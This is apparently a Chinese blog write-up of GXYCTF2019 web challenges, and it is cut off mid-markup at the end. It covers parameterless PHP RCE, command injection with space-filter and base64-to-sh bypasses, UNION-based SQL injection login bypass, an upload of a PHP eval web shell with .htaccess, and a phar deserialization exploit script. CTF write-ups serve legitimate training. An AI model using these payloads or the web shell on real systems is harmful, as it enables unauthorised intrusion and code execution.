    <title>GXYCTF2019-web</title>
    <link href="https://sunny250.github.io/2020/04/26/GXYCTF2019-web/"/>
    <id>https://sunny250.github.io/2020/04/26/GXYCTF2019-web/</id>
    <published>2020-04-26T07:52:11.000Z</published>
    <updated>2020-04-26T07:52:11.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="禁止套娃"><a href="#禁止套娃" class="headerlink" title="禁止套娃"></a>禁止套娃</h2><p>扫描目录发现git泄露</p><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">---- Scanning URL: http:&#x2F;&#x2F;3dead3dc-5858-4353-a9a9-58652f60a1a2.node3.buuoj.cn&#x2F; ----</span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;3dead3dc-5858-4353-a9a9-58652f60a1a2.node3.buuoj.cn&#x2F;.git&#x2F;</span><br><span class="line">+ http:&#x2F;&#x2F;3dead3dc-5858-4353-a9a9-58652f60a1a2.node3.buuoj.cn&#x2F;flag.php (CODE:200|SIZE:0)</span><br><span class="line">+ http:&#x2F;&#x2F;3dead3dc-5858-4353-a9a9-58652f60a1a2.node3.buuoj.cn&#x2F;.git&#x2F;index (CODE:200|SIZE:137)</span><br><span class="line">+ http:&#x2F;&#x2F;3dead3dc-5858-4353-a9a9-58652f60a1a2.node3.buuoj.cn&#x2F;.git&#x2F;config (CODE:200|SIZE:92)</span><br><span class="line">+ http:&#x2F;&#x2F;3dead3dc-5858-4353-a9a9-58652f60a1a2.node3.buuoj.cn&#x2F;.git&#x2F; (CODE:403|SIZE:571)</span><br></pre></td></tr></table></figure><p>使用githack复原代码得到</p> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"flag在哪里呢？&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'exp'</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">'/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i'</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[a-z,_]+\((?R)?\)/'</span>, <span class="keyword">NULL</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!preg_match(<span class="string">'/et|na|info|dec|bin|hex|oct|pi|log/i'</span>, $_GET[<span class="string">'exp'</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET['exp'];</span></span><br><span class="line">                @<span class="keyword">eval</span>($_GET[<span class="string">'exp'</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">"还差一点哦！"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"再好好想想！"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"还想读flag，臭弟弟！"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>第二个正则不大能看懂，于是百度一下得到考点：<strong>无参数rec</strong>  skysec师傅的<a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/" target="_blank" rel="noopener">文章</a>介绍得很详细</p><blockquote><p>能执行a(b()),a()之类的函数，a(“1”),这样就不行。</p></blockquote><p>看完skysec师傅的文章后知道了第二个正则匹配的的意思</p><p> 第一个正则的意思payload是不能使用包含下列字符串的伪协议</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data:&#x2F;&#x2F;,php:&#x2F;&#x2F;,phar:&#x2F;&#x2F;,filter:&#x2F;&#x2F;</span><br></pre></td></tr></table></figure><p>第三个也是payload不能包含下列字符串 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">et|na|info|dec|bin|hex|oct|pi|log</span><br></pre></td></tr></table></figure><p>使用session_id进行无参数rce，</p><p>过滤了et，不能使用file_get_contents,之类的函数，但是可以使用highlight_file、show_source</p><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exp&#x3D;show_source(session_id(session_start()));</span><br></pre></td></tr></table></figure><p>修改cookie中PHPSESSID=flag.php</p><p>访问即可拿到flag</p><h2 id="Ping-Ping-Ping"><a href="#Ping-Ping-Ping" class="headerlink" title="Ping Ping Ping"></a>Ping Ping Ping</h2><p>打开题目给出了<code>/?ip=</code>是命令注入 </p><p>过滤了空格，<code>$IFS</code>,<code>,</code>可以代替空格</p><p>反引号扩起来的表示取结果</p><p>paylaod:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip&#x3D;127.0.0.1;cat$IFS&#96;ls&#96;;</span><br></pre></td></tr></table></figure><p>看到了过滤源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'ip'</span>]))&#123;</span><br><span class="line">  $ip = $_GET[<span class="string">'ip'</span>];</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">"/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;1f&#125;]|\&gt;|\'|\"|\\|\(|\)|\[|\]|\&#123;|\&#125;/"</span>, $ip, $match))&#123;</span><br><span class="line">    <span class="keyword">echo</span> preg_match(<span class="string">"/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\'|\"|\\|\(|\)|\[|\]|\&#123;|\&#125;/"</span>, $ip, $match);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"fxck your symbol!"</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">"/ /"</span>, $ip))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"fxck your space!"</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">"/bash/"</span>, $ip))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"fxck your bash!"</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(preg_match(<span class="string">"/.*f.*l.*a.*g.*/"</span>, $ip))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"fxck your flag!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  $a = shell_exec(<span class="string">"ping -c 4 "</span>.$ip);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;"</span>;</span><br><span class="line">  print_r($a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>参考<a href="https://www.cnblogs.com/wangtanzhi/p/12246386.html" target="_blank" rel="noopener">王叹之师傅的博客</a>还可以可以进行变量赋值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sunny250@QAQdeMacBook ~ % b&#x3D;asd</span><br><span class="line">sunny250@QAQdeMacBook ~ % echo $b</span><br><span class="line">asd</span><br></pre></td></tr></table></figure><p>于是又得到另一种payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?ip&#x3D;127.0.0.1;a&#x3D;g;cat$IFS$1fla$a.php</span><br></pre></td></tr></table></figure><p>过滤了bash，还可以执行sh，通过编码绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</span><br></pre></td></tr></table></figure><p>绕过空格方式（参考来之颖奇师傅的<a href="https://www.gem-love.com/ctf/516" target="_blank" rel="noopener">博客</a>）</p><blockquote><p>$IFS</p><p>${IFS}</p><p>$IFS$9</p><p>&lt;</p><p>&lt;&gt;</p><p>{cat,flag.php} //用逗号实现了空格功能，需要用<code>{}</code>括起来</p><p>%20</p><p>%09 </p></blockquote><h2 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h2><p>题目给了提示</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--MMZFM422K5HDASKDN5TVU3SKOZRFGQRRMMZFM6KJJBSG6WSYJJWESSCWPJNFQSTVLFLTC3CJIQYGOSTZKJ2VSVZRNRFHOPJ5--&gt;</span></span><br></pre></td></tr></table></figure><p>base32后base64解码得到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from user where username &#x3D; &#39;$name&#39;</span><br></pre></td></tr></table></figure><p>给出了闭合方式</p><p>经过测试过滤了or，大写绕过。然后是常规sql</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">name&#x3D;admin&#39;union select 1,2,3#&amp;pw&#x3D;</span><br><span class="line">&#x2F;&#x2F;wrong pass!</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">name&#x3D;&#39;union select 1,&#39;admin&#39;,3#&amp;pw&#x3D;</span><br><span class="line">&#x2F;&#x2F;wrong pass!</span><br></pre></td></tr></table></figure><p>发现直接填写密码是错误的，尝试MD5，成功</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">name&#x3D;&#39;union select 1,&#39;admin&#39;,&#39;21232f297a57a5a743894a0e4a801fc3&#39;#&amp;pw&#x3D;admin</span><br><span class="line">&#x2F;&#x2F;flag&#123;db82a88f-343e-4c70-9761-a50345e1ef8c&#125;</span><br></pre></td></tr></table></figure><h2 id="BabyUpload"><a href="#BabyUpload" class="headerlink" title="BabyUpload"></a>BabyUpload</h2><p>上传.haccess,1.ww。MIME : image/jpeg</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: eb3b2c5c-5ebe-4485-b09e-054c41fd176e.node3.buuoj.cn</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span>: multipart/form-data; boundary=---------------------------21225023787917569654236041647</span><br><span class="line"><span class="attribute">Content-Length</span>: 398</span><br><span class="line"><span class="attribute">Origin</span>: http://eb3b2c5c-5ebe-4485-b09e-054c41fd176e.node3.buuoj.cn</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Referer</span>: http://eb3b2c5c-5ebe-4485-b09e-054c41fd176e.node3.buuoj.cn/</span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=4c25aec0ff86fd39ba68c58584a387a8</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"></span><br><span class="line">-----------------------------21225023787917569654236041647</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="uploaded"; filename="1.ww"</span><br><span class="line"><span class="attribute">Content-Type</span>: image/jpeg</span><br><span class="line"></span><br><span class="line"><span class="attribute">GIF89a</span></span><br><span class="line">&lt;script language="php"&gt; </span><br><span class="line"><span class="attribute">eval($_POST[cmd]);</span></span><br><span class="line"><span class="attribute">&lt;/script&gt;</span></span><br><span class="line"><span class="attribute">-----------------------------21225023787917569654236041647</span></span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="submit"</span><br><span class="line"></span><br><span class="line">ä¸ä¼ </span><br><span class="line">-----------------------------21225023787917569654236041647--</span><br></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: eb3b2c5c-5ebe-4485-b09e-054c41fd176e.node3.buuoj.cn</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span>: multipart/form-data; boundary=---------------------------4018079373823486313032354502</span><br><span class="line"><span class="attribute">Content-Length</span>: 444</span><br><span class="line"><span class="attribute">Origin</span>: http://eb3b2c5c-5ebe-4485-b09e-054c41fd176e.node3.buuoj.cn</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Referer</span>: http://eb3b2c5c-5ebe-4485-b09e-054c41fd176e.node3.buuoj.cn/</span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=4c25aec0ff86fd39ba68c58584a387a8</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"></span><br><span class="line">-----------------------------4018079373823486313032354502</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="uploaded"; filename=".htaccess"</span><br><span class="line"><span class="attribute">Content-Type</span>: image/jpeg</span><br><span class="line"></span><br><span class="line">#define height 12</span><br><span class="line">#define width 12</span><br><span class="line">AddType application/x-httpd-php .ww</span><br><span class="line">php_value auto_append_file "1.ww"</span><br><span class="line">-----------------------------4018079373823486313032354502</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="submit"</span><br><span class="line"></span><br><span class="line">ä¸ä¼ </span><br><span class="line">-----------------------------4018079373823486313032354502--</span><br></pre></td></tr></table></figure><p>蚁剑连接即可</p><h2 id="BabysqliV3-0"><a href="#BabysqliV3-0" class="headerlink" title="BabysqliV3.0"></a>BabysqliV3.0</h2><p>admin，password弱密码直接登入</p><p>登入后看见连接，尝试为协议读取源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;upload.php</span><br><span class="line">&lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;utf-8&quot; &#x2F;&gt; </span><br><span class="line"></span><br><span class="line">&lt;form action&#x3D;&quot;&quot; method&#x3D;&quot;post&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;</span><br><span class="line">上传文件</span><br><span class="line">&lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file&quot; &#x2F;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;上传&quot; &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">class Uploader&#123;</span><br><span class="line">public $Filename;</span><br><span class="line">public $cmd;</span><br><span class="line">public $token;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function __construct()&#123;</span><br><span class="line">$sandbox &#x3D; getcwd().&quot;&#x2F;uploads&#x2F;&quot;.md5($_SESSION[&#39;user&#39;]).&quot;&#x2F;&quot;;</span><br><span class="line">$ext &#x3D; &quot;.txt&quot;;</span><br><span class="line">@mkdir($sandbox, 0777, true);</span><br><span class="line">if(isset($_GET[&#39;name&#39;]) and !preg_match(&quot;&#x2F;data:\&#x2F;\&#x2F; | filter:\&#x2F;\&#x2F; | php:\&#x2F;\&#x2F; | \.&#x2F;i&quot;, $_GET[&#39;name&#39;]))&#123;</span><br><span class="line">$this-&gt;Filename &#x3D; $_GET[&#39;name&#39;];</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">$this-&gt;Filename &#x3D; $sandbox.$_SESSION[&#39;user&#39;].$ext;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$this-&gt;cmd &#x3D; &quot;echo &#39;&lt;br&gt;&lt;br&gt;Master, I want to study rizhan!&lt;br&gt;&lt;br&gt;&#39;;&quot;;</span><br><span class="line">$this-&gt;token &#x3D; $_SESSION[&#39;user&#39;];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function upload($file)&#123;</span><br><span class="line">global $sandbox;</span><br><span class="line">global $ext;</span><br><span class="line"></span><br><span class="line">if(preg_match(&quot;[^a-z0-9]&quot;, $this-&gt;Filename))&#123;</span><br><span class="line">$this-&gt;cmd &#x3D; &quot;die(&#39;illegal filename!&#39;);&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">if($file[&#39;size&#39;] &gt; 1024)&#123;</span><br><span class="line">$this-&gt;cmd &#x3D; &quot;die(&#39;you are too big (′▽&#96;〃)&#39;);&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">$this-&gt;cmd &#x3D; &quot;move_uploaded_file(&#39;&quot;.$file[&#39;tmp_name&#39;].&quot;&#39;, &#39;&quot; . $this-&gt;Filename . &quot;&#39;);&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function __toString()&#123;</span><br><span class="line">global $sandbox;</span><br><span class="line">global $ext;</span><br><span class="line">&#x2F;&#x2F; return $sandbox.$this-&gt;Filename.$ext;</span><br><span class="line">return $this-&gt;Filename;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function __destruct()&#123;</span><br><span class="line">if($this-&gt;token !&#x3D; $_SESSION[&#39;user&#39;])&#123;</span><br><span class="line">$this-&gt;cmd &#x3D; &quot;die(&#39;check token falied!&#39;);&quot;;</span><br><span class="line">&#125;</span><br><span class="line">eval($this-&gt;cmd);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_FILES[&#39;file&#39;])) &#123;</span><br><span class="line">$uploader &#x3D; new Uploader();</span><br><span class="line">$uploader-&gt;upload($_FILES[&quot;file&quot;]);</span><br><span class="line">if(@file_get_contents($uploader))&#123;</span><br><span class="line">echo &quot;下面是你上传的文件：&lt;br&gt;&quot;.$uploader.&quot;&lt;br&gt;&quot;;</span><br><span class="line">echo file_get_contents($uploader);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>在析构方法中看见了<code>eval</code>函数,还看见了<code>__toString</code>应该是序列化没错了，但是没看见unserialize，那就是phar序列化</p><p>寻找pop链接</p><blockquote><p>在最后的判断函数中，file_get_contents会触发<code>__toString</code>,filename可控，在<code>__destruct</code>中执行</p></blockquote><p>编写phar脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Uploader</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $Filename;</span><br><span class="line">    <span class="keyword">public</span> $cmd;</span><br><span class="line">    <span class="keyword">public</span> $token;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;cmd=<span class="string">'show_source("flag.php");'</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;token=<span class="string">'GXYfddf1387c1384a5dd61134d16247860b'</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;Filename=<span class="string">'test'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> Uploader();</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br><span class="line"></span><br><span class="line">@unlink(<span class="string">'poc.phar'</span>);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"poc.phar"</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">"GIF89a __HALT_COMPILER(); ?&gt;"</span>);</span><br><span class="line">$phar-&gt;setMetadata($a); </span><br><span class="line">$phar-&gt;addFromString(<span class="string">"1"</span>, <span class="string">"0"</span>); </span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure><p>在<code>__destruct</code>函数中,token要等于session</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;token != $_SESSION[<span class="string">'user'</span>])&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;cmd = <span class="string">"die('check token falied!');"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;cmd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>__construct</code>中给出了存在session的位置</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">$sandbox = getcwd().<span class="string">"/uploads/"</span>.md5($_SESSION[<span class="string">'user'</span>]).<span class="string">"/"</span>;</span><br><span class="line">$ext = <span class="string">".txt"</span>;</span><br><span class="line">@mkdir($sandbox, <span class="number">0777</span>, <span class="keyword">true</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'name'</span>]) <span class="keyword">and</span> !preg_match(<span class="string">"/data:\/\/ | filter:\/\/ | php:\/\/ | \./i"</span>, $_GET[<span class="string">'name'</span>]))&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;Filename = $_GET[<span class="string">'name'</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;Filename = $sandbox.$_SESSION[<span class="string">'user'</span>].$ext;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">$this</span>-&gt;cmd = <span class="string">"echo '&lt;br&gt;&lt;br&gt;Master, I want to study rizhan!&lt;br&gt;&lt;br&gt;';"</span>;</span><br><span class="line"><span class="keyword">$this</span>-&gt;token = $_SESSION[<span class="string">'user'</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>随意上传一下文件得到session</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">下面是你上传的文件：</span><br><span class="line">&#x2F;var&#x2F;www&#x2F;html&#x2F;uploads&#x2F;e9791ad48bd0c6877a17604b0ad113bb&#x2F;GXYfddf1387c1384a5dd61134d16247860b.txt</span><br></pre></td></tr></table></figure><p>比如此处<strong>GXYfddf1387c1384a5dd61134d16247860b</strong>就是session</p><p>然后上传poc.phar文件，得到文件地址，再随意上传一个文件同时传入参数name</p><figure class="highlight 